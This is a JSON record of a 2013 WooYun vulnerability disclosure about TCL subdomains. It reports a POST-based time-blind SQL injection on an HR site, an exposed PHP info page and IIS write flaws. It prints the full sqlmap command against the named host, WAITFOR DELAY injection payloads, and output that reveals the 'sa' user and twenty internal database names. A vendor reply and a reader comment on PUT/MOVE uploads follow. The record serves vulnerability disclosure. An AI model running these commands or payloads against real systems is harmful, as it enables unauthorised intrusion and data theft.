{"id": 6575, "wybug_id": "wooyun-2013-045010", "wybug_title": "TCL#某分站漏洞大礼包（SQL注射、IIS读写、信息泄露）", "wybug_corp": "TCL官方网上商城", "wybug_author": "Mr.leo", "wybug_date": "2013-12-05 18:52", "wybug_open_date": "2014-01-19 18:53", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-19：\t细节向公众公开  简要描述： TCL#某分站漏洞大礼包（SQL注射、IIS读写、信息泄露） 详细说明：  站点1：http://ehr.tcl.com与 WooYun: TCL某分站SQL注入可shell再入内网 属于同一站点，原漏洞利用方式为GET，厂商没有修复以post方式的注入，此漏洞为时间延迟注入注入参数为Pernrsqlmap.py -u \"http://ehr.tcl.com/ehr\" --data \"Pernr=1&Pswrd=1\" -p \"Pernr\" --dbs --current-user --current-db[root@Hacker~]# Sqlmap sqlmap.py -u \"http://ehr.tcl.com/ehr\" --data \"Pernr=1&Pswrd=1\" -p \"Pernr\" --dbs --current-user --current-db    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 15:07:25[15:07:25] [INFO] resuming back-end DBMS 'microsoft sql server'[15:07:25] [INFO] testing connection to the target urlsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: Pernr    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: Pernr=1'; WAITFOR DELAY '0:0:5';--&Pswrd=1    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: Pernr=1' WAITFOR DELAY '0:0:5'--&Pswrd=1---[15:07:25] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008[15:07:25] [INFO] fetching current user[15:07:25] [INFO] resumed: sacurrent user:    'sa'[15:07:25] [INFO] fetching current database[15:07:25] [INFO] resumed: EHR5current database:    'EHR5'[15:07:25] [INFO] fetching database names[15:07:25] [INFO] fetching number of databases[15:07:25] [INFO] resumed: 20[15:07:25] [INFO] resumed: appjob[15:07:25] [INFO] resumed: dbAudit[15:07:25] [INFO] resumed: dbGLS[15:07:25] [INFO] resumed: dbSurvey[15:07:25] [INFO] resumed: dbVQ[15:07:25] [INFO] resumed: EHR4[15:07:25] [INFO] resumed: EHR5\\t[15:07:25] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[15:07:25] [INFO] resumed: E?R6[15:07:25] [INFO] resumed: HRDB![15:07:25] [INFO] resumed: master[15:07:25] [INFO] resumed: model[15:07:25] [INFO] resumed: msdb[15:07:25] [INFO] resumed: ReportTerver[15:07:25] [INFO] resumed: ReportServerTempDB[15:07:25] [INFO] resumed: SAP_SAGEM[15:07:25] [INFO] resumed: TCL_CTS[15:07:25] [INFO] resumed: TCL_CTS_TEST[15:07:25] [INFO] resumed: TCL_OQSS[15:07:25] [INFO] resumed: tempCts\\x05[15:07:25] [INFO] resumed: tempdbSa用户\n\navailable databases [20]:[*] [E?R6][*] [HRDB!][*] [tempCts][*] appjob[*] dbAudit[*] dbGLS[*] dbSurvey[*] dbVQ[*] EHR4[*] EHR5[*] master[*] model[*] msdb[*] ReportServerTempDB[*] ReportTerver[*] SAP_SAGEM[*] TCL_CTS[*] TCL_CTS_TEST[*] TCL_OQSS[*] tempdbDBA权限已经修复了，权限没有原来的大。站点2：php信息泄露http://218.106.133.39/test.php站点3：多个目录存在IIS读写漏洞\n\n由于在内网，老兵软件无法使用代理方式验证，只能有wvs扫描的结果了\n\n   漏洞证明：  available databases [20]:[*] [E?R6][*] [HRDB!][*] [tempCts][*] appjob[*] dbAudit[*] dbGLS[*] dbSurvey[*] dbVQ[*] EHR4[*] EHR5[*] master[*] model[*] msdb[*] ReportServerTempDB[*] ReportTerver[*] SAP_SAGEM[*] TCL_CTS[*] TCL_CTS_TEST[*] TCL_OQSS[*] tempdb   修复方案：  1#仔细过滤每一种参数提交的方式2#屏蔽信息泄露、升级IIS版本   版权声明：转载请注明来源 Mr.leo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-12-05 22:53 厂商回复： 感谢您的工作，已转交相关部门确认处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-19 19:24 |    \t\tHRay \t\t\t( 普通白帽子  |\t\t\t        Rank:196 漏洞数:28        | 018)\t\t \n  由于在内网，老兵软件无法使用代理方式验证，只能有wvs扫描的结果了，其实用wvs的http editor提交put与move的数据包就行了，没必要以来老兵那个工具    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}